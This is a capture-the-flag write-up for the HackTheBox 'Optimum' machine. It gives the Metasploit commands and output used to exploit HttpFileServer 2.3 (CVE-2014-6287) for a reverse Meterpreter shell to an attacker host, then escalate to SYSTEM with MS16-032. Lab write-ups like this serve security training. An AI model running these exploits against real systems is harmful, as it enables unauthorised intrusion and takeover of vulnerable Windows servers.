# HackTheBox - Optimum

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Optimum |
| **Category** | Windows Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-20 |

## Objective 🎯

Optimum is a Windows Server 2012 machine running HFS (HTTP File Server) with a known vulnerability. The goal is to exploit the HFS vulnerability to gain system access and obtain both user and root flags. HFS exploitation with privilege escalation! ⚡

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.8
- **OS**: Windows Server 2012
- **Service**: HFS (HTTP File Server)

### Tools Used
- Nmap
- Metasploit
- HFS exploit

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.8
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.8
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-03 10:00 UTC
Nmap scan report for 10.10.10.8
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Step 2: Web Service Enumeration
Check the web service for version information.

**Command/Code:**
```bash
curl http://10.10.10.8/
```

**Output:**
```
<html>
<head>
<title>HFS 2.3</title>
</head>
<body>
<h1>HttpFileServer 2.3</h1>
</body>
</html>
```

### Step 3: HFS Exploitation
Use Metasploit to exploit the HFS vulnerability.

**Command/Code:**
```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.10.10.8
set LHOST 10.10.14.2
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.8:80 - Connecting to the server...
[*] 10.10.10.8:80 - Sending exploit...
[*] Sending stage (175174 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.8:49158) at 2024-09-03 10:05:23 +0000
```

### Step 4: Post-Exploitation
Once we have a Meterpreter session, gather information and find flags.

**Command/Code:**
```bash
getuid
sysinfo
shell
whoami
```

**Output:**
```
Server username: OPTIMUM\kostas
Computer        : OPTIMUM
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : en_US
Domain          : OPTIMUM
Logged On Users : 1
Meterpreter     : x64/windows
```

### Step 5: Privilege Escalation
Check for privilege escalation opportunities using Windows Exploit Suggester.

**Command/Code:**
```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### Step 6: MS16-032 Exploitation
Use the MS16-032 exploit for privilege escalation.

**Command/Code:**
```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4445 
[*] Writing payload file to C:\Users\kostas\AppData\Local\Temp\cVQJhV.exe
[*] Sending stage (175174 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.2:4445 -> 10.10.10.8:49159) at 2024-09-03 10:10:23 +0000
```

### Step 7: Find User Flag
Search for the user flag.

**Command/Code:**
```bash
getuid
dir C:\Users\kostas\Desktop
type C:\Users\kostas\Desktop\user.txt
```

**Output:**
```
[REDACTED]
```

### Step 8: Find Root Flag
Search for the root flag.

**Command/Code:**
```bash
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\root.txt
```

**Output:**
```
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify HFS service
2. Identify HttpFileServer 2.3 version
3. Use Metasploit HFS exploit for initial access
4. Gain user-level access as kostas
5. Use Windows Exploit Suggester to find privilege escalation
6. Exploit MS16-032 for SYSTEM privileges
7. Search for user and root flags
8. Extract both flags

## Key Learnings

- HFS (HttpFileServer) vulnerabilities
- Windows privilege escalation techniques
- MS16-032 exploit usage
- Windows Exploit Suggester tool
- Multi-stage exploitation process

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning
- **Metasploit**: Exploitation framework
- **HFS exploit**: Rejetto HFS RCE
- **MS16-032**: Privilege escalation exploit

### References
- [CVE-2014-6287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287)
- [MS16-032 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)

## Screenshots

[Add screenshots of nmap scan, HFS exploitation, privilege escalation, and flag extraction here]

## Tags

`#hackthebox` `#windows` `#hfs` `#privilege-escalation` `#ms16-032` `#easy`
